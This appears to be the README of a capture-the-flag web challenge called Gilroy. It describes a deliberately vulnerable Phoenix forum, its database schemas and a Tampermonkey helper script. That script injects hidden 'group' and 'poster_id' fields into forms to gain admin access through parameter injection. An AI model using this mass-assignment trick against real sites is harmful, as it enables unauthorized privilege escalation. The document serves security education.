# Gilroy

vito's parameter injection web chall for quals

built with Raw Water technology!

## concept

1. players submit a ticket and get an instanced, per-team message board
3. players can register an unprivileged account and get access to more
   than just the gbs-equivalent
1. see rumors about a secret admin forum
2. players can jiggle a parameter to get an admin account
4. flag is in the admin forum

## postgres design

* `tickets` - id, slug, encrypted, reset_at, database, seed

## sqlite3 design

* `posters` - id, name, password_digest, is_admin
* `forums` - id, name, order
* `threads` - id, name, forum_id, poster_id
* `posts` - id, body, thread_id, poster_id

## tampermonkey helper

```js
// ==UserScript==
// @name         gilroy tool
// @namespace    http://tampermonkey.net/
// @version      2024-04-15
// @description  try to take over the world!
// @author       You
// @match        http://localhost:4000/forum/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=undefined.localhost
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    for (let f of document.
      querySelectorAll("form[action='/forum/newuser.php']")) {
        f.innerHTML += "<input type='text' name='group' value='2'>"
    }

    for (let f of document.
      querySelectorAll("form[action='/forum/newthread.php']")) {
        f.innerHTML += "<input type='text' name='poster_id' value=''>"
    }
})();
```

## trivia

named after "Gilroy Monsanto,"
a character on episode one, c.f.
<https://www.youtube.com/watch?v=BzfWjIaqVog>

# original readme follows

To start your Phoenix server:

  * Run `mix setup` to install and setup dependencies
  * Start Phoenix endpoint with `mix phx.server` or inside IEx with `iex -S mix phx.server`

Now you can visit [`localhost:4000`](http://localhost:4000) from your browser.

Ready to run in production? Please [check our deployment guides](https://hexdocs.pm/phoenix/deployment.html).

## Learn more

  * Official website: https://www.phoenixframework.org/
  * Guides: https://hexdocs.pm/phoenix/overview.html
  * Docs: https://hexdocs.pm/phoenix
  * Forum: https://elixirforum.com/c/phoenix-forum
  * Source: https://github.com/phoenixframework/phoenix
